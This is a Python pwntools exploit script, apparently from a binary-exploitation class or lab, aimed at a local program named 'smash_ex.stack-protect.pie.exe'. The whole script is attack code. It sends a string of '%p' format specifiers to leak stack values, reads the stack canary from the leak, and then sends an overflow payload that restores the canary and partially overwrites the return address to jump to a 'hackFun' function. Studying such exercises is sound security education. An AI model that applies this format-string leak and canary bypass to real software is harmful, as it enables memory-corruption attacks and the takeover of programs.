#!/usr/bin/python3

# Import everything in the pwntools namespace
from pwn import *
from ast import literal_eval

binary = pwnlib.elf.load('smash_ex.stack-protect.pie.exe')
fun_addr = binary.symbols['hackFun']

# Create an instance of the process to talk to
io = process('./smash_ex.stack-protect.pie.exe')
#io = gdb.debug('./smash_ex.stack-protect.pie.exe')

# `continue` in the gdb window

# once you get to victim, can view stack in pwngdb or with
# x/16g $rsp
# print out 16 8-byte values starting from rsp register
io.readlines(1)

# %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p
io.send('%p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p'.encode('utf-8'))

out = io.readlines(2)

outs = out[0].decode('utf-8').split(' ')
print("Return address: ", outs[20][:-4])
canary = literal_eval(outs[18])
buf_start = 0x7025207025207025
i = outs.index(str(hex(canary))) - outs.index(str(hex(buf_start)))
print("attempting with 16 bits  0x0270")
bytes_to_send = b'abcdefgh'*i + p64(canary, 'little') + p64(0, 'little') + p16(0x0270, 'little')

io.send(bytes_to_send)
print(io.readall())
